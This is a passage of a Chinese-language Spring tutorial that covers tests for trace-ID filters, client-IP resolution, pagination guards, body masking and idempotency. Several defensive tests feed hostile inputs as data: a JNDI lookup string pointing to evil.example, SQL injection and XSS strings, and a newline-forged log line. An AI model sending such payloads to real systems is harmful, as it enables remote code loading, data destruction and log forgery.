import org.slf4j.MDC;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

import java.io.IOException;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class TraceIdFilterTest {

    // ★ 用介面的 DISABLED 常數，不需要建構反射版的 provider
    private final TraceIdFilter filter =
            new TraceIdFilter(new TraceIdSource(TracingTraceIdProvider.DISABLED));

    @AfterEach
    void clearMdc() {
        MDC.clear();
    }

    @Test
    void 沒有上游ID時自己產生() throws Exception {
        var request = new MockHttpServletRequest("GET", "/orders");
        var response = new MockHttpServletResponse();

        String[] captured = new String[1];
        FilterChain chain = (req, res) -> captured[0] = MDC.get(TraceContext.MDC_TRACE_ID);

        filter.doFilter(request, response, chain);

        assertThat(captured[0]).matches("^[0-9a-f]{16}$");
        assertThat(response.getHeader(TraceContext.HEADER_TRACE_ID)).isEqualTo(captured[0]);
    }

    @Test
    void 沿用上游的X_Request_Id() throws Exception {
        var request = new MockHttpServletRequest("GET", "/orders");
        request.addHeader(TraceContext.HEADER_REQUEST_ID, "gw-abc123def456");
        var response = new MockHttpServletResponse();

        String[] captured = new String[1];
        filter.doFilter(request, response,
                (req, res) -> captured[0] = MDC.get(TraceContext.MDC_TRACE_ID));

        assertThat(captured[0]).isEqualTo("gw-abc123def456");
    }

    // ★ 這組測試守住 log injection（4.5.3）
    @ParameterizedTest
    @ValueSource(strings = {
            "aaaa FAKE_LOG_LINE_WITH_NEWLINE",
            "aaaa null",
            "aaaa'; DROP TABLE users; --",
            "<script>alert(1)</script>",
            "${jndi:ldap://evil.example/x}",
            "短",
            "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
    })
    void 惡意的上游ID被拒絕並改用自己產生的(String malicious) throws Exception {
        var request = new MockHttpServletRequest("GET", "/orders");
        request.addHeader(TraceContext.HEADER_REQUEST_ID, malicious);
        var response = new MockHttpServletResponse();

        String[] captured = new String[1];
        filter.doFilter(request, response,
                (req, res) -> captured[0] = MDC.get(TraceContext.MDC_TRACE_ID));

        assertThat(captured[0])
                .as("惡意輸入必須被拒絕：%s", malicious)
                .matches("^[0-9a-f]{16}$")
                .isNotEqualTo(malicious);
    }

    @Test
    void 換行字元的上游ID被拒絕() throws Exception {
        // 用 String.valueOf(char) 組出換行，避免測試原始碼含控制字元
        String malicious = "aaaaaaaa" + (char) 10 + "ERROR 偽造的稽核紀錄";

        var request = new MockHttpServletRequest("GET", "/orders");
        request.addHeader(TraceContext.HEADER_REQUEST_ID, malicious);
        var response = new MockHttpServletResponse();

        String[] captured = new String[1];
        filter.doFilter(request, response,
                (req, res) -> captured[0] = MDC.get(TraceContext.MDC_TRACE_ID));

        assertThat(captured[0]).matches("^[0-9a-f]{16}$");
    }

    @Test
    void 請求結束後MDC必須清空() throws Exception {
        var request = new MockHttpServletRequest("GET", "/orders");
        var response = new MockHttpServletResponse();

        filter.doFilter(request, response, (req, res) -> { });

        // ★ 這個斷言守住「執行緒池重用時 traceId 洩漏到下一個請求」
        assertThat(MDC.get(TraceContext.MDC_TRACE_ID)).isNull();
        assertThat(MDC.get(TraceContext.MDC_CLIENT_IP)).isNull();
    }

    @Test
    void 即使拋例外MDC也要被清空() {
        var request = new MockHttpServletRequest("GET", "/orders");
        var response = new MockHttpServletResponse();

        assertThatThrownBy(() ->
                filter.doFilter(request, response, (req, res) -> {
                    throw new IOException("boom");
                })).isInstanceOf(IOException.class);

        assertThat(MDC.get(TraceContext.MDC_TRACE_ID)).isNull();
    }
}
```

**最後兩個測試特別重要** —— 它們守住的是**跨請求的資料污染**，
而那種 bug 在單一請求的測試裡永遠不會出現。

⚠️ **注意「換行字元」的測試刻意用 `(char) 10` 組字串**，
而不是在原始碼裡寫 `"\n"`。理由是：
`@ValueSource` 的字串字面值裡放控制字元會讓某些工具（diff、code review、
甚至 IDE 的搜尋）出現詭異行為。**組出來比寫出來安全。**

### 4.14.2 `ClientIpResolver` 的測試

```java
package example.shop.common.web;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.mock.web.MockHttpServletRequest;

import static org.assertj.core.api.Assertions.assertThat;

class ClientIpResolverTest {

    // ★ 最終版是 bean（4.13.6），代理層數從設定讀
    private final ClientIpResolver resolver = new ClientIpResolver(
            new FilterProperties(262_144, 1));      // trustedProxyCount = 1

    @Test
    void 從右往左數而不是取第一個() {
        var request = new MockHttpServletRequest();
        // 攻擊者偽造 8.8.8.8；Nginx 附加真實 peer IP 203.0.113.42
        request.addHeader("X-Forwarded-For", "8.8.8.8, 203.0.113.42");
        request.setRemoteAddr("10.0.0.1");

        assertThat(resolver.resolve(request))
                .as("必須取最右邊（Nginx 加上的真實 peer），不是最左邊（可偽造）")
                .isEqualTo("203.0.113.42");
    }

    @Test
    void 單一hop時直接用它() {
        var request = new MockHttpServletRequest();
        request.addHeader("X-Forwarded-For", "203.0.113.42");
        assertThat(resolver.resolve(request)).isEqualTo("203.0.113.42");
    }

    @Test
    void 沒有XFF時用remoteAddr() {
        var request = new MockHttpServletRequest();
        request.setRemoteAddr("203.0.113.42");
        assertThat(resolver.resolve(request)).isEqualTo("203.0.113.42");
    }

    @ParameterizedTest
    @ValueSource(strings = {"<script>", "'; DROP TABLE", "not-an-ip-at-all"})
    void 非法IP被標記為invalid(String malicious) {
        var request = new MockHttpServletRequest();
        request.setRemoteAddr(malicious);
        assertThat(resolver.resolve(request)).isEqualTo("invalid");
    }

    @Test
    void 超長的IP被標記為invalid() {
        var request = new MockHttpServletRequest();
        request.setRemoteAddr("1".repeat(100));
        assertThat(resolver.resolve(request)).isEqualTo("invalid");
    }
}
```

⚠️ **第一個測試揭露了 4.5.4 實作的一個 bug。**

原本的程式碼是：

```java
int index = hops.size() - 1 - TRUSTED_PROXY_COUNT;
// hops = ["8.8.8.8", "203.0.113.42"], size=2, TRUSTED_PROXY_COUNT=1
// index = 2 - 1 - 1 = 0 → hops[0] = "8.8.8.8"   ← 錯！拿到偽造的
```

**正確的邏輯**：Nginx 收到 `X-Forwarded-For: 8.8.8.8` 後**附加** peer IP，
變成 `8.8.8.8, 203.0.113.42`。
所以「最右邊那一個」（`203.0.113.42`）就是 Nginx 看到的真實 peer。

```java
// ✅ 修正 4.5.4 的 ClientIpResolver.resolve
static String resolve(HttpServletRequest request) {
    String xff = request.getHeader("X-Forwarded-For");
    if (xff != null && !xff.isBlank()) {
        List<String> hops = java.util.Arrays.stream(xff.split(","))
                .map(String::trim).filter(s -> !s.isEmpty()).toList();
        // ★ 我們信任「最後 TRUSTED_PROXY_COUNT 個 hop」是自己的代理加上的。
        //   Nginx 一層 → 最右邊那一個就是客戶端到 Nginx 的 peer IP。
        int index = hops.size() - TRUSTED_PROXY_COUNT;
        if (index >= 0 && index < hops.size()) {
            return sanitizeIp(hops.get(index));
        }
        // hop 數少於預期（可能沒經過代理）→ 保守地用 remoteAddr
    }
    return sanitizeIp(request.getRemoteAddr());
}
```

驗證：`hops.size()=2`、`TRUSTED_PROXY_COUNT=1` → `index = 1` → `hops[1] = "203.0.113.42"` ✅

> **這一段刻意保留了「先寫錯、被測試抓到、然後修正」的過程。**
> `X-Forwarded-For` 的索引計算是很容易寫錯的東西，
> 而寫錯的後果（依 IP 限流可被繞過）**不會有任何錯誤訊息**。
> 所以這裡一定要有測試。

⚠️ **`TRUSTED_PROXY_COUNT` 應該做成設定**，因為部署架構會變
（加了 CDN 就變兩層）。寫死在程式碼裡，搬到 Cloudflare 後面就會壞掉。

### 4.14.3 Interceptor 的測試

```java
package example.shop.common.web;

import example.shop.common.config.ApiLimitProperties;
import example.shop.common.error.ValidationFailedException;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class PageableGuardInterceptorTest {

    // 參數順序見 02 章 2.11.4：
    // maxPageSize, defaultPageSize, maxOffset, maxRequestBodyBytes,
    // maxJsonDepth, maxOrderItems, maxValidationErrors, maxMultiValueParams
    private final ApiLimitProperties limits = new ApiLimitProperties(
            100, 20, 10_000, 1_048_576, 20, 50, 20, 20);
    private final PageableGuardInterceptor interceptor = new PageableGuardInterceptor(limits);

    @Test
    void size超限拋出驗證例外而不是靜默夾取() {
        var request = new MockHttpServletRequest("GET", "/orders");
        request.setParameter("size", "1000000");

        assertThatThrownBy(() ->
                interceptor.preHandle(request, new MockHttpServletResponse(), new Object()))
                .isInstanceOf(ValidationFailedException.class)
                .satisfies(e -> {
                    var violations = ((ValidationFailedException) e).fieldViolations();
                    assertThat(violations).hasSize(1);
                    assertThat(violations.get(0).field()).isEqualTo("size");
                    // ★ 訊息要告訴使用者正確的做法
                    assertThat(violations.get(0).message()).contains("匯出功能");
                });
    }

    @ParameterizedTest
    @CsvSource({"1", "20", "100"})
    void size在範圍內通過(String size) throws Exception {
        var request = new MockHttpServletRequest("GET", "/orders");
        request.setParameter("size", size);
        assertThat(interceptor.preHandle(request, new MockHttpServletResponse(), new Object()))
                .isTrue();
    }

    @Test
    void 深分頁被拒絕() {
        var request = new MockHttpServletRequest("GET", "/orders");
        request.setParameter("page", "5000");
        request.setParameter("size", "20");        // offset = 100,000 > 10,000

        assertThatThrownBy(() ->
                interceptor.preHandle(request, new MockHttpServletResponse(), new Object()))
                .isInstanceOf(ValidationFailedException.class);
    }

    @Test
    void page與cursor不可同時使用() {
        var request = new MockHttpServletRequest("GET", "/orders");
        request.setParameter("page", "1");
        request.setParameter("cursor", "eyJ2IjoxfQ");

        assertThatThrownBy(() ->
                interceptor.preHandle(request, new MockHttpServletResponse(), new Object()))
                .isInstanceOf(ValidationFailedException.class);
    }

    @Test
    void 多值參數超過上限被拒絕() {
        var request = new MockHttpServletRequest("GET", "/orders");
        String[] values = new String[21];
        java.util.Arrays.fill(values, "PAID");
        request.setParameter("status", values);

        assertThatThrownBy(() ->
                interceptor.preHandle(request, new MockHttpServletResponse(), new Object()))
                .isInstanceOf(ValidationFailedException.class);
    }

    @Test
    void ASYNC_dispatch時跳過檢查() throws Exception {
        var request = new MockHttpServletRequest("GET", "/orders");
        request.setDispatcherType(jakarta.servlet.DispatcherType.ASYNC);
        request.setParameter("size", "1000000");        // 超限但應該被跳過

        // ★ 守住 4.7.4 的「preHandle 被呼叫兩次」問題
        assertThat(interceptor.preHandle(request, new MockHttpServletResponse(), new Object()))
                .isTrue();
    }

    @Test
    void POST請求不檢查分頁參數() throws Exception {
        var request = new MockHttpServletRequest("POST", "/orders");
        request.setParameter("size", "1000000");
        assertThat(interceptor.preHandle(request, new MockHttpServletResponse(), new Object()))
                .isTrue();
    }
}
```

### 4.14.4 整合測試：驗證 filter 順序與非同步行為

**4.12.2 說「實際行為要測試確認」。這是那個測試。**

```java
package example.shop.common.web;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.boot.test.web.client.TestRestTemplate;

import static org.assertj.core.api.Assertions.assertThat;

/**
 * Filter / Interceptor 的整合行為。
 *
 * <p>⚠️ 用真的 web server（不是 MockMvc），因為 MockMvc 不會跑完整的
 * filter chain dispatcher type 邏輯，也不會有真的執行緒切換。
 */
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
class LifecycleIntegrationTest {

    @Autowired TestRestTemplate rest;

    @Test
    void 所有回應都帶traceId的header() {
        var response = rest.getForEntity("/orders/ord_does_not_exist", String.class);

        // ★ 即使是 404 也要有（這是選 Filter 而不是 Interceptor 的理由）
        assertThat(response.getStatusCode().value()).isEqualTo(404);
        assertThat(response.getHeaders().getFirst(TraceContext.HEADER_TRACE_ID))
                .isNotBlank()
                .matches("^[0-9a-f]{16}$");
    }

    @Test
    void 未認證的請求也有traceId() {
        var response = rest.getForEntity("/orders", String.class);
        assertThat(response.getStatusCode().value()).isIn(401, 403);
        assertThat(response.getHeaders().getFirst(TraceContext.HEADER_TRACE_ID)).isNotBlank();
    }

    @Test
    void 回應header的traceId與body裡的一致() {
        var response = rest.getForEntity("/orders/ord_does_not_exist", String.class);

        String headerTraceId = response.getHeaders().getFirst(TraceContext.HEADER_TRACE_ID);
        assertThat(response.getBody())
                .as("Problem JSON 的 traceId 必須與 header 一致（4.4.1 的 ERROR dispatch 問題）")
                .contains(headerTraceId);
    }

    @Test
    void 不存在的路徑不會回HTML() {
        var response = rest.getForEntity("/ordres", String.class);
        assertThat(response.getHeaders().getContentType().toString())
                .contains("problem+json");
        assertThat(response.getBody()).doesNotContain("<html");
    }
}
```

⚠️ **「Callable 內部有 traceId」這件事無法用 header 驗證** ——
它是 log 的內容。**要驗證它需要攔截 log**：

```java
package example.shop.common.web;

import ch.qos.logback.classic.Logger;
import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.core.read.ListAppender;
import org.slf4j.LoggerFactory;

import java.util.List;

/** 測試用的 log 攔截器。 */
public class LogCaptor implements AutoCloseable {

    private final Logger logger;
    private final ListAppender<ILoggingEvent> appender = new ListAppender<>();

    public LogCaptor(Class<?> loggerClass) {
        this.logger = (Logger) LoggerFactory.getLogger(loggerClass);
        appender.start();
        logger.addAppender(appender);
    }

    public List<ILoggingEvent> events() {
        return List.copyOf(appender.list);
    }

    /** 取某一筆 log 當時的 MDC 值。 */
    public String mdcOf(int index, String key) {
        return appender.list.get(index).getMDCPropertyMap().get(key);
    }

    @Override
    public void close() {
        logger.detachAppender(appender);
        appender.stop();
    }
}
```

```java
@Test
void MdcTaskDecorator讓背景執行緒也有traceId() {
    try (var captor = new LogCaptor(AsyncProbeController.class)) {
        var response = rest.getForEntity("/probe/async", String.class);
        String headerTraceId = response.getHeaders().getFirst(TraceContext.HEADER_TRACE_ID);

        // 等非同步完成
        org.awaitility.Awaitility.await()
                .atMost(java.time.Duration.ofSeconds(3))
                .until(() -> captor.events().size() >= 2);

        String controllerTraceId = captor.mdcOf(0, TraceContext.MDC_TRACE_ID);
        String callableTraceId = captor.mdcOf(1, TraceContext.MDC_TRACE_ID);

        assertThat(controllerTraceId).isEqualTo(headerTraceId);
        assertThat(callableTraceId)
                .as("Callable 內部的 traceId 必須與 Controller 一致（4.5.7）")
                .isEqualTo(controllerTraceId);
    }
}
```

⚠️ **`Awaitility` 是額外依賴**（`org.awaitility:awaitility`，test scope）。
不想加的話用 `Thread.sleep(500)` —— **但那是 flaky test 的來源**，
在 CI 的慢機器上會偶發失敗。

### 4.14.5 `BodyMasker` 的測試

```java
package example.shop.common.web;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

class BodyMaskerTest {

    private final BodyMasker masker = new BodyMasker();

    @Test
    void 遮蔽密碼欄位() {
        String masked = masker.mask("{\"username\":\"wang\",\"password\":\"secret123\"}");
        assertThat(masked)
                .contains("\"username\":\"wang\"")
                .contains("\"password\":\"***\"")
                .doesNotContain("secret123");
    }

    @Test
    void 跳脫字元不會讓遮蔽抓錯範圍() {
        // ★ 這個測試守住 4.6.4 的 regex 陷阱
        String json = "{\"note\":\"my password is \\\"abc\\\"\",\"password\":\"real-secret\"}";

        String masked = masker.mask(json);

        assertThat(masked)
                .as("真正的密碼必須被遮蔽")
                .doesNotContain("real-secret");
        assertThat(masked)
                .as("note 欄位的內容不該被誤遮")
                .contains("abc");
    }

    @Test
    void 巢狀欄位也被遮蔽() {
        String masked = masker.mask(
                "{\"payment\":{\"cardNumber\":\"4242424242424242\",\"cvv\":\"123\"}}");
        assertThat(masked)
                .contains("\"cvv\":\"***\"")
                .contains("4242")                       // 卡號保留末四碼
                .doesNotContain("4242424242424242");
    }

    @Test
    void 陣列裡的欄位也被遮蔽() {
        String masked = masker.mask(
                "{\"users\":[{\"name\":\"a\",\"password\":\"p1\"},"
                + "{\"name\":\"b\",\"password\":\"p2\"}]}");
        assertThat(masked).doesNotContain("p1").doesNotContain("p2");
    }

    @Test
    void 包含式命名也被抓到() {
        // customerPassword、userApiKey 這種命名
        String masked = masker.mask(
                "{\"customerPassword\":\"x1\",\"userApiKey\":\"y1\",\"normalField\":\"z1\"}");
        assertThat(masked)
                .doesNotContain("x1")
                .doesNotContain("y1")
                .contains("\"normalField\":\"z1\"");
    }

    /**
     * ★★★ 這是這一組測試裡最重要的一個，而它最容易被忽略。
     *
     * <p>遮蔽測試通常只寫「該遮的有遮」。<b>但過度遮蔽也是 bug</b>，
     * 而且它的後果更難發現：
     *
     * <table>
     *   <tr><th></th><th>漏遮</th><th>過度遮蔽</th></tr>
     *   <tr><td>後果</td><td>密碼進日誌</td><td><b>稽核紀錄失去價值</b></td></tr>
     *   <tr><td>什麼時候發現</td><td>安全掃描、code review</td>
     *       <td><b>出事要查「當時客戶送了什麼」的時候</b></td></tr>
     *   <tr><td>有症狀嗎</td><td>有（日誌裡看得到）</td><td><b>完全沒有</b>（日誌看起來很正常）</td></tr>
     * </table>
     *
     * <p>★ 清單裡的前五個是<b>真實踩過的坑</b>：
     * {@code BodyMasker} 的模糊比對清單曾經含 {@code "pin"}（想抓提款卡密碼），
     * 而 {@code shippingAddressId}、{@code shippingFee}、{@code shippingAddress}、
     * {@code shippingMethod} 全部含 {@code "pin"} ——
     * <b>於是每一筆下單請求的收件地址與運費在日誌與稽核紀錄裡都是 {@code ***}</b>。
     */
    @ParameterizedTest(name = "{0} 不可以被遮蔽")
    @ValueSource(strings = {
            // 🔴 真實的 bug：模糊比對清單曾經含 "pin"
            "shippingAddressId", "shippingAddress", "shippingFee", "shippingMethod",
            "billingAddressId",
            // 一般業務欄位
            "orderId", "orderNumber", "productId", "quantity", "couponCode",
            "customerNote", "status", "currency",
            // 容易誤中 PII 模糊比對的
            "emailTemplateId", "phoneCountryCode"})
    void 正當欄位不可以被誤遮(String field) {
        String masked = masker.mask("{\"" + field + "\":\"visible-business-value\"}");
        assertThat(masked)
                .as("""
                    %s 被遮蔽了，但它不是敏感欄位。

                    ⚠️ 過度遮蔽的後果是【稽核紀錄失去價值】——
                       而它沒有任何症狀，只在出事要查
                       「當時客戶送了什麼」時才發現查不到。

                    最可能的原因：有人往 BodyMasker.FUZZY_HINTS 加了一個太短的關鍵字
                    （規則：模糊比對的關鍵字長度至少 6）。

                    修法（依偏好順序）：
                      1. 把關鍵字改長
                      2. 改成精確比對（放進 FULLY_MASKED 而不是 FUZZY_HINTS）
                      3. 把這個欄位加進 NEVER_MASKED
                    """, field)
                .contains("visible-business-value");
    }

    @Test
    void 無法解析時不回傳原文() {
        // ★ 關鍵安全測試：解析失敗時絕不能洩漏原文
        String masked = masker.mask("{\"password\":\"leaked\", not valid json");
        assertThat(masked)
                .as("解析失敗時不可回傳原文")
                .doesNotContain("leaked")
                .startsWith("(無法解析的 body");
    }

    @Test
    void 超長的值被截斷() {
        String masked = masker.mask("{\"note\":\"" + "x".repeat(500) + "\"}");
        assertThat(masked).contains("…").hasSizeLessThan(300);
    }

    @Test
    void query_string也被遮蔽() {
        assertThat(masker.maskQueryString("page=1&token=abc123&size=20"))
                .isEqualTo("page=1&token=***&size=20");
    }
}
```

**倒數第二個測試（「無法解析時不回傳原文」）是最重要的一個。**
它守住的是「日誌洩漏密碼」——
而那件事在 code review 時很容易被忽略（因為 fallback 回傳原文「看起來很合理」）。

### 4.14.6 冪等的整合測試

```java
package example.shop.order.web;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.test.web.servlet.MockMvc;

import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.times;
import static org.mockito.Mockito.verify;
import static org.springframework.http.MediaType.APPLICATION_JSON;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.header;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

/**
 * ⚠️ 冪等需要 Filter + Interceptor + Store 全部到位，
 * 所以用 @SpringBootTest 而不是 @WebMvcTest（後者不會跑 filter chain）。
 */
@SpringBootTest
@AutoConfigureMockMvc
class IdempotencyIntegrationTest {

    @Autowired MockMvc mockMvc;
    @org.springframework.test.context.bean.override.mockito.MockitoBean OrderService orderService;

    private static final String BODY = """
            {"items":[{"productId":"P-1001","quantity":2}],
             "shippingAddressId":"addr_01J5GK"}
            """;

    @Test
    void 重複送同一個冪等鍵不會重複建立() throws Exception {
        String key = "idem-test-0001";

        mockMvc.perform(post("/orders").header("Idempotency-Key", key)
                        .contentType(APPLICATION_JSON).content(BODY))
                .andExpect(status().isCreated())
                .andExpect(header().doesNotExist("Idempotent-Replay"));

        mockMvc.perform(post("/orders").header("Idempotency-Key", key)
                        .contentType(APPLICATION_JSON).content(BODY))
                .andExpect(status().isCreated())                    // ★ 同樣的 201
                .andExpect(header().string("Idempotent-Replay", "true"));

        verify(orderService, times(1)).create(any());               // ★ 只執行一次
    }

    @Test
    void 同一個key不同body回409() throws Exception {
        String key = "idem-test-0002";

        mockMvc.perform(post("/orders").header("Idempotency-Key", key)
                        .contentType(APPLICATION_JSON).content(BODY))
                .andExpect(status().isCreated());

        String differentBody = """
                {"items":[{"productId":"P-9999","quantity":1}],
                 "shippingAddressId":"addr_01J5GK"}
                """;

        mockMvc.perform(post("/orders").header("Idempotency-Key", key)
                        .contentType(APPLICATION_JSON).content(differentBody))
                .andExpect(status().isConflict())
                .andExpect(org.springframework.test.web.servlet.result.MockMvcResultMatchers
                        .jsonPath("$.code").value("IDEMPOTENCY_KEY_REUSED"));

        verify(orderService, times(1)).create(any());
    }

    @Test
    void 缺少冪等鍵回400() throws Exception {
        mockMvc.perform(post("/orders")
                        .contentType(APPLICATION_JSON).content(BODY))
                .andExpect(status().isBadRequest())
                .andExpect(org.springframework.test.web.servlet.result.MockMvcResultMatchers
                        .jsonPath("$.code").value("IDEMPOTENCY_KEY_REQUIRED"));
    }

    @Test
    void 五xx不會被記錄成冪等結果() throws Exception {
        String key = "idem-test-0003";
        org.mockito.Mockito.when(orderService.create(any()))
                .thenThrow(new IllegalStateException("boom"))
                .thenReturn(sampleResult());

        mockMvc.perform(post("/orders").header("Idempotency-Key", key)
                        .contentType(APPLICATION_JSON).content(BODY))
                .andExpect(status().isInternalServerError());

        // ★ 第二次應該真的重試（不是重播 500）
        mockMvc.perform(post("/orders").header("Idempotency-Key", key)
                        .contentType(APPLICATION_JSON).content(BODY))
                .andExpect(status().isCreated())
                .andExpect(header().doesNotExist("Idempotent-Replay"));

        verify(orderService, times(2)).create(any());
    }
}
```

**最後一個測試守住 4.9.5 的「5xx 不存」決策。**
如果實作寫錯（存了 500），使用者會**永遠**拿到那個 500，
而且重試完全無效 —— 那是很難查的問題。

---

## 4.15 常見誤區

**誤區 1：「用 `@Component` 註冊 filter 就好」**

問題：無法設 URL pattern、無法設 dispatcher types。
而**沒設 `@Order` 的話它會排在 Spring Security 之後** —— 
那意味著它看不到被認證擋掉的請求（4.4.4）。

**誤區 2：「`ContentCachingRequestWrapper` 能讓 body 重複讀」**

4.4.6：它只能「事後記錄已被讀取的內容」。
在 `chain.doFilter()` 之前呼叫 `getContentAsByteArray()` 一定是空的。
要重複讀必須自己寫 wrapper。

**誤區 3：「包裝 response 沒有成本」**

`ContentCachingResponseWrapper` 把整個回應緩衝到記憶體。
一個 500 MB 的匯出檔案會直接 OOM。**串流端點必須排除**（4.4.6）。

而且**忘記 `copyBodyToResponse()` 會讓所有回應都變成空的** ——
狀態碼正確但 body 是空的，非常難查（因為「狀態碼對」會讓你以為程式在動）。

**誤區 4：「MDC 會自動傳到子執行緒」**

4.5.6：不會（而且不同 logback 版本的繼承行為不同）。
`@Async`、`Callable`、執行緒池都需要 `TaskDecorator`（4.5.7）。

**誤區 5：「MDC 不用清理，反正每個請求都會重設」**

4.5.4：如果某個路徑上的 filter 沒跑（例如它有 `shouldNotFilter`），
那個請求會**沿用上一個請求的 traceId** —— 比「沒有 traceId」更糟，
因為它是**錯的**，會讓你查到別人的紀錄。

而虛擬執行緒雖然不重用，**但你不能假設一定跑在虛擬執行緒上**
（`@Async` 的 `ThreadPoolTaskExecutor` 就是平台執行緒池）。

**誤區 6：「Interceptor 的順序用 `@Order` 控制」**

4.7.3：Interceptor 的順序是**註冊順序**。`@Order` 對它無效。
這和 Filter 不同，很容易搞錯。

**誤區 7：「`postHandle` 適合做清理」**

4.7.1：例外發生時 `postHandle` **不執行**。
清理一律寫在 `afterCompletion`。

**誤區 8：「`preHandle` 回 `false` 就會回 200」**

回 `false` 只是「不要繼續」。**回應內容完全由你負責。**
什麼都不寫 = 200 + 空 body = 使用者看到白畫面。

**誤區 9：「冪等鍵存 Redis 就好」**

Redis 的 `SETNX` 是原子的，但它**無法與業務交易一起提交**。
所以「業務寫入成功但 Redis 寫入失敗」或反之，都會產生不一致
（02 章練習 2 的 Bug B 是同一個問題）。

**正確做法是「業務資料與冪等紀錄在同一個資料庫交易裡」**，
Redis 只能當第一層快速篩選。

**誤區 10：「非同步端點的 `preHandle` 只會執行一次」**

4.7.4：ASYNC dispatch 會再執行一次。
冪等鍵、限流計數這類「只該做一次」的邏輯會被執行兩次。

**誤區 11：「AOP 可以用來做請求日誌」**

4.11.1：拿不到 HTTP 細節、涵蓋不到 404 / 401、需要 proxy。
Web 層的橫切一律用 Filter / Interceptor。

**誤區 12：「`X-Forwarded-For` 取第一個就是客戶端 IP」**

4.5.4、4.14.2：第一個是**客戶端可偽造的**。
要從右往左數，數過你控制的代理層數。
取錯的話「依 IP 限流」可以被無限繞過 —— **而且完全沒有錯誤訊息**。

**誤區 13：「日誌記得越多越好」**

4.6.2 的成本試算：完整 body 日誌一天 345 GB。
而且它會記錄敏感資料（遮蔽清單一定會漏）。
**必須是「可動態開啟 + 自動關閉」**（4.6.6）。

**誤區 14：「限流沒標註的端點就不限流」**

4.16 練習 3：那讓**每個新端點都是一個漏洞**。
安全的預設值是「預設有限流，要放寬才明確宣告」。

**誤區 15：「traceId 有就好，格式不重要」**

4.5.2 的三個設計決策都有理由：
- **長度**：太長客服無法口述（UUID 是 36 字元），太短會碰撞。
- **字元集**：要能安全地放進 log、URL、header。
- **驗證**：不驗證上游的值就是 log injection（4.5.3）。

---

## 4.16 本章練習

### 練習 1：為這 8 個需求選擇機制

對每個需求，選出 Filter / Interceptor / ArgumentResolver / `ResponseBodyAdvice` / AOP，
並說出**決定性的理由**（不是「都可以」）。

| # | 需求 |
|---|---|
| 1 | 所有回應加上 `X-Api-Version: 2026-08-01` header |
| 2 | 依端點限流：`POST /orders` 每個使用者每分鐘 10 次 |
| 3 | 標了 `@AuditLog` 的 Controller 方法要寫一筆稽核紀錄（含請求參數） |
| 4 | 所有 `BigDecimal` 欄位序列化成字串（而不是數字） |
| 5 | 偵測「回應時間 > 3 秒」並記 warn |
| 6 | `GET` 端點自動加上 `ETag` 並支援 `304` |
| 7 | 把 `?fields=id,name` 的欄位篩選套用到回應（稀疏欄位集） |
| 8 | Service 方法呼叫外部 API 失敗時自動重試 3 次 |

<details>
<summary>解答</summary>

| # | 選擇 | 決定性理由 |
|---|---|---|
| 1 | **Filter** | 要涵蓋**所有**回應，包含 404 / 401 / 靜態資源。Interceptor 對 404 不執行（4.7.1） |
| 2 | **Interceptor** | 需要（a）知道是哪個端點 → `HandlerMethod`；（b）知道是誰 → Security 之後。<br>⚠️ 若限流要涵蓋「未認證的暴力請求」，那還要一層 Filter（order < -100）依 IP 限流，**兩層都要**（練習 3） |
| 3 | **Interceptor** + `@AuditLog` 註解 | 要讀方法上的註解 → 必須有 `HandlerMethod`。<br>⚠️ 但「含請求參數」有陷阱：`preHandle` 時參數還沒綁定。<br>解法：在 `afterCompletion` 記錄（那時知道成敗），參數從 `CachedBodyRequestWrapper` 拿 |
| 4 | **都不是 —— 用 Jackson 設定**（06 章） | 這是序列化規則，不是橫切邏輯。用 `SimpleModule` 註冊 `BigDecimal` 的 serializer。<br>用 `ResponseBodyAdvice` 做等於自己重寫序列化，很脆弱 |
| 5 | **Filter** | 「回應時間」要含序列化與寫回 socket 的時間 —— Interceptor 的 `afterCompletion` 在那之前 |
| 6 | **Filter**（`ShallowEtagHeaderFilter`）或 **Controller**（深 ETag） | Spring 內建 `ShallowEtagHeaderFilter`：緩衝回應、算 MD5、比對 `If-None-Match`。<br>⚠️ 它會緩衝整個回應（4.4.6 的成本），而且「淺 ETag」仍然執行了完整查詢 —— 只省了網路頻寬。<br>**06 章會說明「深 ETag」（用版本號，在 Controller 產生，01 章 1.12.2）為什麼更好** |
| 7 | **`ResponseBodyAdvice`** | 它拿到「序列化前的物件」，可以套用 `MappingJacksonValue` + `@JsonFilter`。<br>Filter 拿到的是已序列化的 bytes（要 parse 回來，很浪費）；Interceptor 拿不到回傳值 |
| 8 | **AOP**（或 Spring Retry 的 `@Retryable`） | 它在 Service 層 → 只有 AOP 能做（4.3.1 最後一列） |

**最容易答錯的三題：4、5、6。**

**第 4 題**的陷阱是「聽起來像橫切關注點」。
判準：**這件事是「協定層的行為」還是「資料表述的規則」？**
後者屬於序列化設定，不屬於任何攔截機制。

**第 5 題**要想清楚「回應時間」有三個不同的定義：

| 量測點 | 不含什麼 |
|---|---|
| `Interceptor.afterCompletion` | 回程 filter、`response.flushBuffer()`、TCP 寫入 |
